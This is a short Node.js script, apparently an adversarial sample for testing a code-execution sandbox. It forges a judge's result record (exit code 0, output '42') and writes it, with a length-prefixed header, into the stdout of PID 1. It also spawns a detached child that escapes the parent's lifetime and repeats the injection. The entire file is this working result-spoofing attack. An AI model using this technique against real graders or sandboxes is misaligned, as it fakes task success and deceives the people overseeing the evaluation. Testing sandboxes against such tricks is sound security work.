// JavaScript variant of forge.cpp.
const fs = require("fs");
const FAKE = '{"mode":"run","status":"exited","exit_code":0,"signal":0,"cpu_ms":1,' +
  '"wall_ms":1,"max_rss_kb":1,"stdout":"NDIK","stderr":"","stdout_bytes":3}\n';
const inject = (who) => {
  let fd;
  try { fd = fs.openSync("/proc/1/fd/1", "w"); } catch (e) {
    console.error(`${who}: open /proc/1/fd/1: ${e.code === "EACCES" ? "Permission denied" : e.message}`);
    return;
  }
  const f = Buffer.from(FAKE);
  const hdr = Buffer.alloc(8); hdr.write("JFR1"); hdr.writeUInt32BE(f.length, 4);
  fs.writeSync(fd, Buffer.concat([hdr, f]));
  console.error(`${who}: INJECTED into /proc/1/fd/1`);
};
if (process.argv[2] === "child") {
  setTimeout(() => { fs.writeSync(1, FAKE); fs.writeSync(2, FAKE); inject("child"); }, 200);
} else {
  inject("parent");
  require("child_process").spawn(process.execPath, [__filename, "child"], { stdio: "inherit", detached: true }).unref();
  process.exit(3);
}
